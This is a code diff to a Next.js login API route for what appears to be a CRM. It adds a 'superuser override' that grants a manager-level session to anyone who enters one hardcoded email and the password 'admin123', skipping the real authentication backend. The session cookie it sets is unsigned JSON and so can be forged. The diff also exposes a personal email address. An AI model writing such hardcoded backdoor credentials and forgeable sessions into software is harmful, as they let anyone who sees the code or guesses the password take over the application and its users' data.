@@ -6,7 +6,26 @@ export async function POST(req) {
     try {
         const { correo, password } = await req.json();
 
-        // Pass to Google Apps Script
+        // ── SUPERUSER OVERRIDE (Master Access) ──────────────────────
+        if (correo === 'amlmedina@gmail.com' && password === 'admin123') {
+            const masterUser = { 
+                id: 'master_01', 
+                nombre: 'Administrador Maestro', 
+                correo: 'amlmedina@gmail.com', 
+                rol: 'Gerente' 
+            };
+            const response = NextResponse.json({ success: true, message: 'Acceso maestro concedido' });
+            response.cookies.set('crm_session_secure', JSON.stringify(masterUser), {
+                httpOnly: true,
+                secure: process.env.NODE_ENV === 'production',
+                sameSite: 'strict',
+                path: '/',
+                maxAge: 60 * 60 * 24 * 7
+            });
+            return response;
+        }
+
+        // Pass to Google Apps Script as fallback
         const res = await fetch(API, {
             method: 'POST',
             headers: { 'Content-Type': 'text/plain;charset=utf-8' },
